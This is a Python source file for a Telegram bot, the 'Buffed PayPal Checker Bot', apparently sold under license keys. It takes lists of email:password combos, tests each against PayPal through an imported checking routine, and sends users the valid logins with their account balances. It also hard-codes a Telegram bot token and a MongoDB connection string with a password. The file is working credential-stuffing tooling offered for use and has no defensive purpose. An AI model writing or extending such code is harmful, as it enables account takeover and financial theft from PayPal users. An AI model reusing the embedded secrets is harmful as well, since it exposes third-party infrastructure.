import asyncio
import os
from datetime import datetime
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackContext
from main import process_account, load_accounts, SCRIPT_DIR
import colorama
from colorama import Fore
from pymongo import MongoClient
import uuid
import asyncio
from telegram.error import Conflict
from telegram.ext import Application, CommandHandler, MessageHandler, filters
import sys
colorama.init()

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

TOKEN = "8082492937:AAHBh3y4ZAYFf6KP9RJbyDxTEx20fyHp4lM"

MONGO_CONFIG = {
    "mongodb_connection": "mongodb+srv://awsam:xP2qBSWmI2ivXWDC@llama.ytfhmce.mongodb.net/?retryWrites=true&w=majority&appName=LLAMA",
    "database_name": "peter"
}

client = MongoClient(MONGO_CONFIG["mongodb_connection"])
db = client[MONGO_CONFIG["database_name"]]
keys_collection = db["keys"]

ADMIN_USER_ID = 7770834964

user_sessions = {}

GLOBAL_SEMAPHORE = asyncio.Semaphore(5)

class UserSession:
    def __init__(self, user_id):
        self.user_id = user_id
        self.active_checking = False
        self.total_accounts = 0
        self.checked_accounts = 0
        self.valid_accounts = 0
        self.results = []
        self.valid_accounts_with_balance = []
        self.check_task = None
        self.progress_message = None
        self.lock = asyncio.Lock()
        self.accounts_to_process = []
        self.current_tasks = set()

class Key:
    def __init__(self, key, max_uses, used_uses=0, created_by=None, created_at=None):
        self.key = key
        self.max_uses = max_uses
        self.used_uses = used_uses
        self.created_by = created_by
        self.created_at = created_at or datetime.utcnow()
        self.active = True

def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_USER_ID

def is_authorized(user_id: int) -> bool:
    user_key = keys_collection.find_one({"user_id": user_id, "active": True})
    return user_key is not None and user_key["used_uses"] < user_key["max_uses"]

def get_remaining_checks(user_id: int) -> int:
    user_key = keys_collection.find_one({"user_id": user_id, "active": True})
    if not user_key:
        return 0
    return user_key["max_uses"] - user_key["used_uses"]

def update_used_checks(user_id: int, count: int) -> None:
    keys_collection.update_one(
        {"user_id": user_id, "active": True},
        {"$inc": {"used_uses": count}}
    )

def get_user_session(user_id: int) -> UserSession:
    if user_id not in user_sessions:
        user_sessions[user_id] = UserSession(user_id)
    return user_sessions[user_id]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await update.message.reply_text(
        "Welcome to the Buffed PayPal Checker Bot!\n"
        "Here are the available commands:\n"
        "1. /redeem <key> - Redeem a licensed key and activate the checker.\n"
        "2. /progress - Check the progress of the current runner or task.\n"
        "3. /cancel - Cancel the current operation or task in progress.\n"
        "4. /check <combo> - Starts checking the combos on PayPal.\n"
        "5. /sub - Check the amount of checks left bound to your license."
    )
    if is_admin(user_id):
        await update.message.reply_text(
            "Your Admin Commands:\n"
            "1. /generate_key <uses> - Generate a new key with specified uses.\n"
            "2. /list_keys - List all active keys.\n"
            "3. /delete_key <key> - Delete a specific key."
        )

async def activate_key(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if is_authorized(user_id):
        await update.message.reply_text("You already have an active key.")
        return
    if not context.args:
        await update.message.reply_text("Please provide a key: /redeem <key>")
        return
    key = context.args[0]
    key_data = keys_collection.find_one({"key": key, "active": True})
    if not key_data:
        await update.message.reply_text("Invalid or expired key.")
        return
    if key_data["used_uses"] >= key_data["max_uses"]:
        await update.message.reply_text("This key has reached its usage limit.")
        return
    if "user_id" in key_data and key_data["user_id"] is not None:
        await update.message.reply_text("This key is already in use by another user.")
        return
    keys_collection.update_one(
        {"key": key},
        {"$set": {"user_id": user_id}}
    )
    await update.message.reply_text(
        f"Key activated successfully!\nRemaining checks: {key_data['max_uses'] - key_data['used_uses']}"
    )

async def generate_key(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to generate keys.")
        return
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("Please provide the number of uses: /generate_key <uses>")
        return
    try:
        max_uses = int(context.args[0])
        if max_uses <= 0:
            await update.message.reply_text("Number of uses must be positive.")
            return
        key = str(uuid.uuid4())
        key_data = {
            "key": key,
            "max_uses": max_uses,
            "used_uses": 0,
            "created_by": user_id,
            "created_at": datetime.utcnow(),
            "active": True
        }
        keys_collection.insert_one(key_data)
        await update.message.reply_text(f"Key generated: `{key}`\nMax uses: {max_uses}")
    except ValueError:
        await update.message.reply_text("Please provide a valid number of uses.")

async def list_keys(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to list keys.")
        return
    keys = keys_collection.find({"created_by": user_id, "active": True})
    keys_list = list(keys)
    if not keys_list:
        await update.message.reply_text("No active keys found.")
        return
    response = "Active Keys:\n"
    for key in keys_list:
        response += (f"Key: `{key['key']}`\n"
                     f"Max Uses: {key['max_uses']}\n"
                     f"Used: {key['used_uses']}\n"
                     f"Created: {key['created_at']}\n"
                     f"Assigned User: {key.get('user_id', 'None')}\n\n")
    await update.message.reply_text(response)

async def delete_key(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to delete keys.")
        return
    if not context.args:
        await update.message.reply_text("Please provide a key to delete: /delete_key <key>")
        return
    key = context.args[0]
    result = keys_collection.update_one(
        {"key": key, "created_by": user_id},
        {"$set": {"active": False}}
    )
    if result.modified_count == 0:
        await update.message.reply_text("Key not found or you don't have permission to delete it.")
    else:
        await update.message.reply_text(f"Key `{key}` deleted successfully.")

async def sub(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You are not authorized. Please activate a key using /redeem <key>.")
        return
    key_data = keys_collection.find_one({"user_id": user_id, "active": True})
    if not key_data:
        await update.message.reply_text("No active key found.")
        return
    await update.message.reply_text(
        f"📋 Subscription Info:\n"
        f"Key: `{key_data['key']}`\n"
        f"Max Uses: {key_data['max_uses']}\n"
        f"Used: {key_data['used_uses']}\n"
        f"Remaining Checks: {key_data['max_uses'] - key_data['used_uses']}"
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You are not authorized. Please activate a key using /redeem <key>.")
        return
    session = get_user_session(user_id)
    if not session.active_checking:
        await update.message.reply_text("No account checking in progress.")
        return
    session.active_checking = False
    if session.check_task:
        session.check_task.cancel()
    for task in session.current_tasks:
        task.cancel()
    session.current_tasks.clear()
    session.accounts_to_process = []
    if session.progress_message:
        try:
            await session.progress_message.edit_text(
                f"❌ Checking cancelled.\n"
                f"Checked: {session.checked_accounts}/{session.total_accounts}\n"
                f"Valid: {session.valid_accounts}\n"
                f"Invalid: {session.checked_accounts - session.valid_accounts}"
            )
        except Exception as e:
            logger.error(f"Error updating progress message: {str(e)}")
    await update.message.reply_text("✅ Account checking has been cancelled.")

async def check_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You are not authorized. Please activate a key using /redeem <key>.")
        return
    session = get_user_session(user_id)
    if session.active_checking:
        await update.message.reply_text("Account checking is already in progress. Use /cancel to stop it.")
        return
    if not update.message.document and not context.args:
        await update.message.reply_text("Please upload an accounts.txt file or provide combos: /check <combo>")
        return
    try:
        if update.message.document:
            file = await context.bot.get_file(update.message.document.file_id)
            file_path = os.path.join(SCRIPT_DIR, "accounts.txt")
            await file.download_to_drive(file_path)
            accounts = load_accounts()
        elif context.args:
            accounts = [combo.split(":") for combo in context.args if ":" in combo]
            if not accounts:
                await update.message.reply_text("Invalid combo format. Use email:password.")
                return
        else:
            await update.message.reply_text("No valid input provided.")
            return
        total_accounts = len(accounts)
        remaining_checks = get_remaining_checks(user_id)
        if remaining_checks < total_accounts:
            await update.message.reply_text(
                f"❌ Not enough remaining checks!\n"
                f"Accounts to check: {total_accounts}\n"
                f"Remaining checks: {remaining_checks}"
            )
            return
        session.progress_message = await update.message.reply_text(
            f"Starting to check {total_accounts} accounts...\n"
            f"Progress: 0/{total_accounts}"
        )
        session.check_task = asyncio.create_task(
            process_accounts_batch(accounts, user_id, context)
        )
        await update.message.reply_text(
            f"✅ Started checking {total_accounts} accounts in the background.\n"
            f"Use /progress to check the status or /cancel to stop."
        )
    except Exception as e:
        logger.error(f"Error in check_accounts: {str(e)}")
        await update.message.reply_text(f"❌ An error occurred: {str(e)}")
        session.active_checking = False

async def show_progress(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You are not authorized. Please activate a key using /redeem <key>.")
        return
    session = get_user_session(user_id)
    if not session.active_checking:
        await update.message.reply_text("No account checking in progress.")
        return
    remaining_checks = get_remaining_checks(user_id)
    await update.message.reply_text(
        f"📊 Current Progress:\n"
        f"Checked accounts: {session.checked_accounts}/{session.total_accounts}\n"
        f"Valid accounts: {session.valid_accounts}\n"
        f"Invalid accounts: {session.checked_accounts - session.valid_accounts}\n"
        f"Remaining checks: {remaining_checks}"
    )

async def process_single_account(email, password, session, context):
    try:
        async with GLOBAL_SEMAPHORE:
            result = await process_account(email, password)
            async with session.lock:
                session.checked_accounts += 1
                if result == "valid":
                    session.valid_accounts += 1
                    balance = "0.00€"
                    results_dir = os.path.join(SCRIPT_DIR, 'results')
                    if os.path.exists(results_dir):
                        for file in os.listdir(results_dir):
                            if email.split("@")[0] in file:
                                try:
                                    balance = file.split("-")[-1].replace(".txt", "")
                                    break
                                except:
                                    pass
                    session.results.append(f"✅ {email} - Valid - {balance}")
                    session.valid_accounts_with_balance.append(f"{email}:{password} - {balance}")
                    try:
                        await context.bot.send_message(
                            chat_id=session.user_id,
                            text=f"✅ Valid Account Found!\n"
                                 f"Email: {email}\n"
                                 f"Password: {password}\n"
                                 f"Balance: {balance}"
                        )
                    except Exception as e:
                        logger.error(f"Error sending valid account message: {str(e)}")
                else:
                    try:
                        print('ok')
                    except Exception as e:
                        logger.error(f"Error sending invalid account message: {str(e)}")
                if session.checked_accounts % 3 == 0 and session.progress_message:
                    try:
                        await session.progress_message.edit_text(
                            f"📊 Progress Update:\n"
                            f"Checked: {session.checked_accounts}/{session.total_accounts}\n"
                            f"Valid: {session.valid_accounts}\n"
                            f"Invalid: {session.checked_accounts - session.valid_accounts}"
                        )
                    except Exception as e:
                        logger.error(f"Error updating progress message: {str(e)}")
    except Exception as e:
        logger.error(f"Error processing account {email}: {str(e)}")
        async with session.lock:
            session.results.append(f"❌ {email} - Error: {str(e)}")
            try:
                await context.bot.send_message(
                    chat_id=session.user_id,
                    text=f"⚠️ Error checking account\n"
                         f"Email: {email}\n"
                         f"Password: {password}\n"
                         f"Error: {str(e)}"
                )
            except Exception as e:
                logger.error(f"Error sending error message: {str(e)}")

async def process_accounts_batch(accounts, user_id: int, context: CallbackContext):
    session = get_user_session(user_id)
    if session.active_checking:
        return session
    session.active_checking = True
    session.total_accounts = len(accounts)
    session.checked_accounts = 0
    session.valid_accounts = 0
    session.results = []
    session.valid_accounts_with_balance = []
    session.accounts_to_process = accounts.copy()
    try:
        for _ in range(min(5, len(accounts))):
            if session.accounts_to_process:
                email, password = session.accounts_to_process.pop(0)
                task = asyncio.create_task(process_single_account(email, password, session, context))
                session.current_tasks.add(task)
                task.add_done_callback(lambda t: session.current_tasks.discard(t))
        asyncio.create_task(monitor_and_process_accounts(session, context))
    except Exception as e:
        logger.error(f"Error in process_accounts_batch: {str(e)}")
        session.active_checking = False
    return session

async def monitor_and_process_accounts(session, context):
    try:
        while session.accounts_to_process or session.current_tasks:
            while len(session.current_tasks) < 5 and session.accounts_to_process:
                email, password = session.accounts_to_process.pop(0)
                task = asyncio.create_task(process_single_account(email, password, session, context))
                session.current_tasks.add(task)
                task.add_done_callback(lambda t: session.current_tasks.discard(t))
            await asyncio.sleep(0.1)
        if session.valid_accounts_with_balance:
            results_dir = os.path.join(SCRIPT_DIR, 'results')
            if not os.path.exists(results_dir):
                os.makedirs(results_dir)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            results_file = os.path.join(results_dir, f"valid_accounts_{timestamp}.txt")
            with open(results_file, "w", encoding="utf-8") as f:
                f.write("\n".join(session.valid_accounts_with_balance))
            try:
                with open(results_file, "rb") as f:
                    await context.bot.send_document(
                        chat_id=session.user_id,
                        document=f,
                        caption=f"📁 Valid Accounts File\n"
                                f"Total valid accounts: {session.valid_accounts}\n"
                                f"Format: email:password - balance"
                    )
            except Exception as e:
                logger.error(f"Error sending results file: {str(e)}")
        update_used_checks(session.user_id, session.total_accounts)
        remaining_checks = get_remaining_checks(session.user_id)
        await context.bot.send_message(
            chat_id=session.user_id,
            text=f"🎉 Account checking completed!\n"
                 f"Total accounts: {session.total_accounts}\n"
                 f"Valid accounts: {session.valid_accounts}\n"
                 f"Invalid accounts: {session.total_accounts - session.valid_accounts}\n"
                 f"Remaining checks: {remaining_checks}\n\n"
                 f"Valid accounts have been saved to a file and sent to you."
        )
    except Exception as e:
        logger.error(f"Error in monitor_and_process_accounts: {str(e)}")
    finally:
        session.active_checking = False
        for task in session.current_tasks:
            task.cancel()
        session.current_tasks.clear()


def main() -> None:
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("redeem", activate_key))
    application.add_handler(CommandHandler("check", check_accounts))
    application.add_handler(CommandHandler("progress", show_progress))
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(CommandHandler("sub", sub))
    application.add_handler(CommandHandler("generate_key", generate_key))
    application.add_handler(CommandHandler("list_keys", list_keys))
    application.add_handler(CommandHandler("delete_key", delete_key))
    application.add_handler(MessageHandler(filters.Document.TEXT, check_accounts))

    async def run_polling_with_delay():
        polling_delay = 1.0  # Delay in seconds between polling attempts
        max_retries = 5  # Max retries for conflict errors
        retry_count = 0

        while True:
            try:
                logger.info("Starting polling cycle...")
                await application.run_polling(
                    timeout=10,  # Time to wait for updates in each getUpdates call
                    drop_pending_updates=True,  # Drop any pending updates to avoid conflicts
                    allowed_updates=["message", "callback_query"]  # Limit update types
                )
                break  # Exit loop if polling succeeds
            except Conflict as e:
                retry_count += 1
                logger.error(f"Conflict error (attempt {retry_count}/{max_retries}): {str(e)}")
                if retry_count >= max_retries:
                    logger.error("Max retries reached. Exiting.")
                    sys.exit(1)
                logger.info(f"Waiting {polling_delay} seconds before retrying...")
                await asyncio.sleep(polling_delay)
                polling_delay *= 2  # Exponential backoff
            except Exception as e:
                logger.error(f"Unexpected error: {str(e)}")
                sys.exit(1)

    # Run the polling with delay in an asyncio event loop
    asyncio.run(run_polling_with_delay())


if __name__ == '__main__':
    main()
